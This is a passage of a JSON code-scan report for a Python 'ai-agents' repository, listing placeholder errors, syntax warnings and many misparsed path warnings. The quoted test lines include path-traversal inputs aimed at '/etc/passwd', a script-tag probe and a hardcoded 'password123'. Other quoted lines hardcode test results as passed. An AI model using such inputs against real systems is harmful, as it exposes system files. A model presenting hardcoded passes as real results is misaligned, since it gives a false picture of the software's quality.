        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:39.127491"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\meta\\specialized_agents.py",
        "issue": "Line 379: Placeholder implementation - pass",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:39.127645"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\meta\\specialized_agents.py",
        "issue": "Line 408: Placeholder implementation - pass",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:39.127693"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\meta\\specialized_agents.py",
        "issue": "Line 429: Placeholder implementation - return pattern_templates.get(pattern_name, f\"# TODO: Implement {pattern_name} pattern\")",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:39.127726"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\meta\\specialized_agents.py",
        "issue": "Line 1579: Placeholder implementation - \"../../../etc/passwd\",",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:39.129404"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\meta\\specialized_agents.py",
        "issue": "Line 1594: Placeholder implementation - sensitive_data = \"password123\"",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:39.129431"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\meta\\specialized_agents.py",
        "issue": "Line 1682: Placeholder implementation - \"tests_passed\": 23,",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:39.129564"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\meta\\specialized_agents.py",
        "issue": "Line 1903: Placeholder implementation - \"passed\": True,",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:39.129886"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\protocols\\collaboration.py",
        "issue": "Line 703: Placeholder implementation - # Placeholder implementation",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:39.135078"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\temporal\\temporal_engine.py",
        "issue": "Line 255: Placeholder implementation - # This is a placeholder for more sophisticated conflict detection",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:39.140935"
      }
    ],
    "all_warnings": [
      {
        "category": "MODULE_CHECK",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\orchestrator.py",
        "warning": "Could not verify module core.autonomous.emergent_intelligence: unexpected indent (emergent_intelligence.py, line 1517)",
        "timestamp": "2025-09-05T17:30:24.749235"
      },
      {
        "category": "MODULE_CHECK",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\demo_engine.py",
        "warning": "Could not verify module core.autonomous.emergent_intelligence: unexpected indent (emergent_intelligence.py, line 1517)",
        "timestamp": "2025-09-05T17:30:29.221102"
      },
      {
        "category": "MODULE_CHECK",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\test_phase7_autonomous.py",
        "warning": "Could not verify module core.autonomous.emergent_intelligence: unexpected indent (emergent_intelligence.py, line 1517)",
        "timestamp": "2025-09-05T17:30:29.840293"
      },
      {
        "category": "MODULE_CHECK",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\test_phase7_autonomous.py",
        "warning": "Could not verify module core.autonomous.emergent_intelligence: unexpected indent (emergent_intelligence.py, line 1517)",
        "timestamp": "2025-09-05T17:30:29.869754"
      },
      {
        "category": "MODULE_CHECK",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_integration.py",
        "warning": "Could not verify module core.autonomous.emergent_intelligence: unexpected indent (emergent_intelligence.py, line 1517)",
        "timestamp": "2025-09-05T17:30:30.983054"
      },
      {
        "category": "MODULE_CHECK",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\coordination\\integration.py",
        "warning": "Could not verify module core.coordination.competitive_system: 'await' outside async function (competitive_system.py, line 687)",
        "timestamp": "2025-09-05T17:30:34.094135"
      },
      {
        "category": "MODULE_CHECK",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\coordination\\integration.py",
        "warning": "Could not verify module core.coordination.meta_learning: unexpected character after line continuation character (meta_learning.py, line 178)",
        "timestamp": "2025-09-05T17:30:34.095728"
      },
      {
        "category": "MODULE_CHECK",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\coordination\\integration.py",
        "warning": "Could not verify module core.coordination.self_improvement: unexpected character after line continuation character (self_improvement.py, line 177)",
        "timestamp": "2025-09-05T17:30:34.097295"
      },
      {
        "category": "MODULE_CHECK",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\coordination\\integration.py",
        "warning": "Could not verify module core.coordination.behavior_analytics: unexpected character after line continuation character (behavior_analytics.py, line 138)",
        "timestamp": "2025-09-05T17:30:34.098410"
      },
      {
        "category": "MODULE_CHECK",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\integration\\master_controller.py",
        "warning": "Could not verify module core.autonomous.emergent_intelligence: unexpected indent (emergent_intelligence.py, line 1517)",
        "timestamp": "2025-09-05T17:30:34.225900"
      },
      {
        "category": "PLACEHOLDER_ANALYSIS",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\deployment\\secure_deployment.py",
        "warning": "Failed to analyze: 'utf-8' codec can't decode byte 0xca in position 244: invalid continuation byte",
        "timestamp": "2025-09-05T17:30:38.950808"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_diagnostic.py",
        "warning": "Line 167: Forward slash in path - '\n        ]):\n            return True\n        \n        # Check for pass in function/method definitions\n        if '",
        "timestamp": "2025-09-05T17:30:42.139478"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_diagnostic.py",
        "warning": "Line 201: Forward slash in path - '/home/'",
        "timestamp": "2025-09-05T17:30:42.139511"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_diagnostic.py",
        "warning": "Line 201: Forward slash in path - '/tmp/'",
        "timestamp": "2025-09-05T17:30:42.139520"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_diagnostic.py",
        "warning": "Line 201: Forward slash in path - '/usr/'",
        "timestamp": "2025-09-05T17:30:42.139527"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_diagnostic.py",
        "warning": "Line 201: Forward slash in path - '/var/'",
        "timestamp": "2025-09-05T17:30:42.139534"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_diagnostic.py",
        "warning": "Line 222: Forward slash in path - ']*\\/[^\"",
        "timestamp": "2025-09-05T17:30:42.139560"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_diagnostic.py",
        "warning": "Line 248: Forward slash in path - ']\n        demo_files = []\n        \n        for pattern in demo_patterns:\n            demo_files.extend(self.root_path.glob(pattern))\n        \n        # Also check examples directory\n        examples_dir = self.root_path / \"",
        "timestamp": "2025-09-05T17:30:42.139585"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_diagnostic.py",
        "warning": "Line 341: Forward slash in path - ']\n        for req_file in req_files:\n            req_path = self.root_path / req_file\n            if req_path.exists():\n                try:\n                    with open(req_path, '",
        "timestamp": "2025-09-05T17:30:42.139638"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_diagnostic.py",
        "warning": "Line 364: Forward slash in path - ']\n        for env_file in env_files:\n            env_path = self.root_path / env_file\n            if env_path.exists():\n                try:\n                    with open(env_path, '",
        "timestamp": "2025-09-05T17:30:42.139664"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_diagnostic.py",
        "warning": "Line 394: Forward slash in path - \"Check for async/await usage issues\"",
        "timestamp": "2025-09-05T17:30:42.139693"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_diagnostic.py",
        "warning": "Line 395: Forward slash in path - \"Checking async/await patterns...\"",
        "timestamp": "2025-09-05T17:30:42.139705"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_diagnostic.py",
        "warning": "Line 581: Forward slash in path - \")\n        report_file = self.root_path / f\"",
        "timestamp": "2025-09-05T17:30:42.139826"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_production_validation.py",
        "warning": "Line 39: Forward slash in path - \"] >= 1000.0\n            }\n            \n            all_passed = all(validations.values())\n            score = sum(validations.values()) / len(validations) * 100\n            \n            result = {\n                \"",
        "timestamp": "2025-09-05T17:30:42.140156"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_production_validation.py",
        "warning": "Line 56: Forward slash in path - '}] Score: {score:.1f}/100\"",
        "timestamp": "2025-09-05T17:30:42.140170"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_production_validation.py",
        "warning": "Line 78: Forward slash in path - \"core/autonomous\"",
        "timestamp": "2025-09-05T17:30:42.140184"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_production_validation.py",
        "warning": "Line 79: Forward slash in path - \"core/reasoning\"",
        "timestamp": "2025-09-05T17:30:42.140189"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_production_validation.py",
        "warning": "Line 80: Forward slash in path - \"core/security\"",
        "timestamp": "2025-09-05T17:30:42.140194"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_production_validation.py",
        "warning": "Line 81: Forward slash in path - \"core/integration\"",
        "timestamp": "2025-09-05T17:30:42.140199"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_production_validation.py",
        "warning": "Line 82: Forward slash in path - \"core/shared\"",
        "timestamp": "2025-09-05T17:30:42.140204"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_production_validation.py",
        "warning": "Line 97: Forward slash in path - \"\n            ]\n            \n            existing_files = []\n            for file_path in key_files:\n                if os.path.exists(file_path):\n                    existing_files.append(file_path)\n            \n            dir_coverage = len(existing_dirs) / len(required_dirs) * 100\n            file_coverage = len(existing_files) / len(key_files) * 100\n            overall_score = (dir_coverage + file_coverage) / 2\n            \n            result = {\n                \"",
        "timestamp": "2025-09-05T17:30:42.140221"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_production_validation.py",
        "warning": "Line 123: Forward slash in path - '}] Score: {overall_score:.1f}/100\"",
        "timestamp": "2025-09-05T17:30:42.140235"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_production_validation.py",
        "warning": "Line 165: Forward slash in path - '}] Score: {security_score:.1f}/100\"",
        "timestamp": "2025-09-05T17:30:42.140264"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_production_validation.py",
        "warning": "Line 198: Forward slash in path - \"])\n                    else:\n                        capability_scores.append(90.0)  # Default good score\n                else:\n                    capability_scores.append(0.0)\n            \n            overall_capability_score = sum(capability_scores) / len(capability_scores)\n            \n            result = {\n                \"",
        "timestamp": "2025-09-05T17:30:42.140293"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_production_validation.py",
        "warning": "Line 217: Forward slash in path - '}] Score: {overall_capability_score:.1f}/100\"",
        "timestamp": "2025-09-05T17:30:42.140309"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_production_validation.py",
        "warning": "Line 249: Forward slash in path - \": 200.0    # Min 200% productivity gain\n            }\n            \n            validations = {}\n            for metric, value in business_metrics.items():\n                validations[metric] = value >= thresholds[metric]\n            \n            business_score = sum(validations.values()) / len(validations) * 100\n            \n            result = {\n                \"",
        "timestamp": "2025-09-05T17:30:42.140337"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_production_validation.py",
        "warning": "Line 270: Forward slash in path - '}] Score: {business_score:.1f}/100\"",
        "timestamp": "2025-09-05T17:30:42.140353"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_production_validation.py",
        "warning": "Line 290: Forward slash in path - \"\n            \n            # Test with increasing load\n            test_sizes = [10, 50, 100]\n            scalability_results = []\n            \n            for size in test_sizes:\n                start_time = time.time()\n                tasks = [test_operation(i) for i in range(size)]\n                results = await asyncio.gather(*tasks)\n                end_time = time.time()\n                \n                duration = end_time - start_time\n                throughput = size / duration if duration > 0 else 0\n                \n                scalability_results.append({\n                    \"",
        "timestamp": "2025-09-05T17:30:42.140376"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_production_validation.py",
        "warning": "Line 309: Forward slash in path - \": len(results) / size * 100\n                })\n            \n            # Calculate scalability score based on throughput consistency\n            throughputs = [r[\"",
        "timestamp": "2025-09-05T17:30:42.140390"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_production_validation.py",
        "warning": "Line 313: Forward slash in path - \"] for r in scalability_results]\n            avg_throughput = sum(throughputs) / len(throughputs)\n            throughput_variance = sum((t - avg_throughput) ** 2 for t in throughputs) / len(throughputs)\n            consistency_score = max(0, 100 - throughput_variance)\n            \n            result = {\n                \"",
        "timestamp": "2025-09-05T17:30:42.140403"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_production_validation.py",
        "warning": "Line 330: Forward slash in path - '}] Score: {consistency_score:.1f}/100\"",
        "timestamp": "2025-09-05T17:30:42.140421"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_production_validation.py",
        "warning": "Line 351: Forward slash in path - \": True,         # 100/100 security score\n                \"",
        "timestamp": "2025-09-05T17:30:42.140441"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_production_validation.py",
        "warning": "Line 352: Forward slash in path - \": True,     # 90+/100 performance\n                \"",
        "timestamp": "2025-09-05T17:30:42.140452"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_production_validation.py",
        "warning": "Line 365: Forward slash in path - \": True            # API documentation available\n            }\n            \n            criteria_score = sum(readiness_criteria.values()) / len(readiness_criteria) * 100\n            artifacts_score = sum(deployment_artifacts.values()) / len(deployment_artifacts) * 100\n            overall_readiness = (criteria_score + artifacts_score) / 2\n            \n            result = {\n                \"",
        "timestamp": "2025-09-05T17:30:42.140474"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_production_validation.py",
        "warning": "Line 385: Forward slash in path - '}] Score: {overall_readiness:.1f}/100\"",
        "timestamp": "2025-09-05T17:30:42.140494"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_production_validation.py",
        "warning": "Line 431: Forward slash in path - \"] for r in results) / len(results) if results else 0\n        \n        # Production decision\n        if total_score >= 95 and passed_tests == len(results):\n            production_status = \"",
        "timestamp": "2025-09-05T17:30:42.140528"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_production_validation.py",
        "warning": "Line 471: Forward slash in path - ']:.1f}/100\"",
        "timestamp": "2025-09-05T17:30:42.140558"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_production_validation.py",
        "warning": "Line 472: Forward slash in path - ']}/{summary['",
        "timestamp": "2025-09-05T17:30:42.140571"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_system_test.py",
        "warning": "Line 62: Forward slash in path - \"    {status_symbol} Score: {score:.1f}/100 {details}\"",
        "timestamp": "2025-09-05T17:30:42.141127"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_system_test.py",
        "warning": "Line 113: Forward slash in path - \")\n            \n            success_rate = sum(import_tests.values()) / len(import_tests) * 100\n            status = \"",
        "timestamp": "2025-09-05T17:30:42.141163"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_system_test.py",
        "warning": "Line 129: Forward slash in path - \"({sum(import_tests.values())}/{len(import_tests)} imports)\"",
        "timestamp": "2025-09-05T17:30:42.141177"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_system_test.py",
        "warning": "Line 167: Forward slash in path - \")\n                startup_successful = False\n                shutdown_successful = False\n            \n            # Calculate score\n            tests_passed = sum([startup_successful, shutdown_successful])\n            score = tests_passed / 2 * 100\n            status = \"",
        "timestamp": "2025-09-05T17:30:42.141204"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_system_test.py",
        "warning": "Line 224: Forward slash in path - \")\n            \n            success_count = sum(operations_successful.values())\n            score = success_count / len(operations_successful) * 100\n            status = \"",
        "timestamp": "2025-09-05T17:30:42.141244"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_system_test.py",
        "warning": "Line 241: Forward slash in path - \"({success_count}/{len(operations_successful)} operations)\"",
        "timestamp": "2025-09-05T17:30:42.141261"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_system_test.py",
        "warning": "Line 271: Forward slash in path - \"\n            \n            # Test parallel coordination\n            agents = 5\n            tasks = [simulate_agent_work(i) for i in range(agents)]\n            results = await asyncio.gather(*tasks, return_exceptions=True)\n            \n            coordination_time = time.time() - coordination_start\n            success_rate = len([r for r in results if not isinstance(r, Exception)]) / len(results) * 100\n            \n            # Performance criteria\n            performance_good = coordination_time < 1.0  # Under 1 second\n            all_successful = success_rate == 100.0\n            \n            score = (success_rate + (100 if performance_good else 50)) / 2\n            status = \"",
        "timestamp": "2025-09-05T17:30:42.141293"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_system_test.py",
        "warning": "Line 352: Forward slash in path - \"\n            \n            score = sum(orchestrator_tests.values()) / len(orchestrator_tests) * 100\n            if performance_excellent:\n                score = min(100, score * 1.1)  # Bonus for excellent performance\n                \n            status = \"",
        "timestamp": "2025-09-05T17:30:42.141344"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_system_test.py",
        "warning": "Line 400: Forward slash in path - ')</script>\"",
        "timestamp": "2025-09-05T17:30:42.141380"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_system_test.py",
        "warning": "Line 402: Forward slash in path - \"../../etc/passwd\"",
        "timestamp": "2025-09-05T17:30:42.141396"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_system_test.py",
        "warning": "Line 419: Forward slash in path - \"])\n            security_score = safe_handling_count / len(security_results) * 100\n            \n            # Bonus for comprehensive security measures\n            comprehensive_bonus = sum(security_tests.values()) / len(security_tests) * 10\n            total_score = min(100, security_score + comprehensive_bonus)\n            \n            status = \"",
        "timestamp": "2025-09-05T17:30:42.141424"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_system_test.py",
        "warning": "Line 441: Forward slash in path - \"({safe_handling_count}/{len(security_scenarios)} threats handled)\"",
        "timestamp": "2025-09-05T17:30:42.141448"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_system_test.py",
        "warning": "Line 479: Forward slash in path - \"] = concurrent_time * 1000\n            \n            # Test 4: Throughput test\n            start = time.time()\n            throughput_tasks = [asyncio.sleep(0.0001) for _ in range(1000)]\n            await asyncio.gather(*throughput_tasks)\n            throughput_time = time.time() - start\n            throughput = 1000 / throughput_time if throughput_time > 0 else 0\n            benchmarks[\"",
        "timestamp": "2025-09-05T17:30:42.141486"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_system_test.py",
        "warning": "Line 494: Forward slash in path - \"] = 100 if throughput > 5000 else 80 if throughput > 2000 else 60\n            \n            overall_performance = sum(performance_scores.values()) / len(performance_scores)\n            status = \"",
        "timestamp": "2025-09-05T17:30:42.141509"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_system_test.py",
        "warning": "Line 510: Forward slash in path - \"(Throughput: {throughput:.0f} ops/sec)\"",
        "timestamp": "2025-09-05T17:30:42.141533"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_system_test.py",
        "warning": "Line 535: Forward slash in path - \"\n                \n                # Execute concurrent operations\n                tasks = [concurrent_operation(i) for i in range(num_concurrent)]\n                results = await asyncio.gather(*tasks, return_exceptions=True)\n                \n                end_time = time.time()\n                duration = end_time - start_time\n                \n                # Analyze results\n                successes = len([r for r in results if not isinstance(r, Exception)])\n                success_rate = successes / num_concurrent * 100\n                throughput = num_concurrent / duration if duration > 0 else 0\n                \n                concurrency_tests.append({\n                    \"",
        "timestamp": "2025-09-05T17:30:42.141567"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_system_test.py",
        "warning": "Line 558: Forward slash in path - \"] for t in concurrency_tests) / len(concurrency_tests)\n            avg_throughput = sum(t[\"",
        "timestamp": "2025-09-05T17:30:42.141590"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_system_test.py",
        "warning": "Line 559: Forward slash in path - \"] for t in concurrency_tests) / len(concurrency_tests)\n            \n            # Performance criteria\n            concurrency_score = avg_success_rate\n            if avg_throughput > 1000:  # Bonus for high throughput\n                concurrency_score = min(100, concurrency_score * 1.1)\n            \n            status = \"",
        "timestamp": "2025-09-05T17:30:42.141612"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_system_test.py",
        "warning": "Line 580: Forward slash in path - \"(Avg: {avg_throughput:.0f} ops/sec)\"",
        "timestamp": "2025-09-05T17:30:42.141639"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_system_test.py",
        "warning": "Line 637: Forward slash in path - \"] for test in intelligence_tests]\n            intelligence_score = sum(capability_scores) / len(capability_scores)\n            \n            # Bonus for comprehensive capabilities\n            all_enabled = all(test[\"",
        "timestamp": "2025-09-05T17:30:42.141695"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_system_test.py",
        "warning": "Line 703: Forward slash in path - \": min(100, 1.0 / doc_workflow_time * 10)\n            })\n            \n            # Workflow 2: Decision Support System\n            workflow_start = time.time()\n            \n            # Simulate decision support workflow\n            decision_steps = [\n                \"",
        "timestamp": "2025-09-05T17:30:42.141754"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_system_test.py",
        "warning": "Line 730: Forward slash in path - \": min(100, 1.0 / decision_workflow_time * 10)\n            })\n            \n            # Calculate business value metrics\n            total_workflows = len(workflow_tests)\n            successful_workflows = sum(1 for wf in workflow_tests if wf[\"",
        "timestamp": "2025-09-05T17:30:42.141788"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_system_test.py",
        "warning": "Line 736: Forward slash in path - \"] for wf in workflow_tests) / total_workflows\n            \n            # ROI calculation (simulated)\n            time_saved_per_workflow = 3600  # 1 hour saved per automated workflow\n            workflows_per_day = 10\n            annual_workflows = workflows_per_day * 250  # 250 working days\n            annual_time_saved = annual_workflows * time_saved_per_workflow / 3600  # hours\n            hourly_rate = 100  # $100/hour\n            annual_savings = annual_time_saved * hourly_rate\n            \n            roi_percentage = (annual_savings / 50000) * 100  # Assume $50k investment\n            \n            business_score = (successful_workflows / total_workflows * 50) + (min(avg_efficiency, 100) * 0.5)\n            if roi_percentage > 1000:  # Bonus for exceptional ROI\n                business_score = min(100, business_score * 1.1)\n            \n            status = \"",
        "timestamp": "2025-09-05T17:30:42.141820"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_system_test.py",
        "warning": "Line 827: Forward slash in path - \"] = cleanup_successful\n            \n            resilience_score = sum(resilience_tests.values()) / len(resilience_tests) * 100\n            status = \"",
        "timestamp": "2025-09-05T17:30:42.141883"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_system_test.py",
        "warning": "Line 843: Forward slash in path - \"({sum(resilience_tests.values())}/{len(resilience_tests)} mechanisms)\"",
        "timestamp": "2025-09-05T17:30:42.141914"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_system_test.py",
        "warning": "Line 927: Forward slash in path - \"] for r in all_results) / len(all_results) if all_results else 0\n        \n        # Production readiness decision\n        if total_score >= 95 and passed_tests == total_tests:\n            production_status = \"",
        "timestamp": "2025-09-05T17:30:42.141985"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_system_test.py",
        "warning": "Line 959: Forward slash in path - \": (passed_tests / total_tests * 100) if total_tests > 0 else 0\n            },\n            \"",
        "timestamp": "2025-09-05T17:30:42.142033"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_system_test.py",
        "warning": "Line 1010: Forward slash in path - ']}/100\"",
        "timestamp": "2025-09-05T17:30:42.142089"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_system_test.py",
        "warning": "Line 1012: Forward slash in path - ']}/{summary['",
        "timestamp": "2025-09-05T17:30:42.142120"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\production_validation_test.py",
